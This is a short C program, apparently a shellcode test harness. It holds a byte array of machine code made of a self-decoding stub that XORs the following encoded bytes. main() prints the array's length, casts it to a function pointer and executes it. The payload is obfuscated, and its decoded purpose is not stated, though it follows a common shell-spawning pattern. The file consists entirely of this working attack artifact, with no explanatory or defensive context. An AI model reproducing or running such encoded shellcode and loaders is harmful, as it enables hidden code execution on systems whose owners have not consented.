#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x15\x5e\xb1\x19\x31\xc0\x99\xb0\x90\x8a\x16\x30\xd0\x88\x06\x88\xd0\x46\xe2\xf5\xeb\x05\xe8\xe6\xff\xff\xff\xa1\x61\x31\x59\x76\x59\x2a\x42\x2a\x05\x67\x0e\x60\xe9\x0a\x5a\xd3\x31\x62\xeb\x0a\xba\xb1\x7c\xfc";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}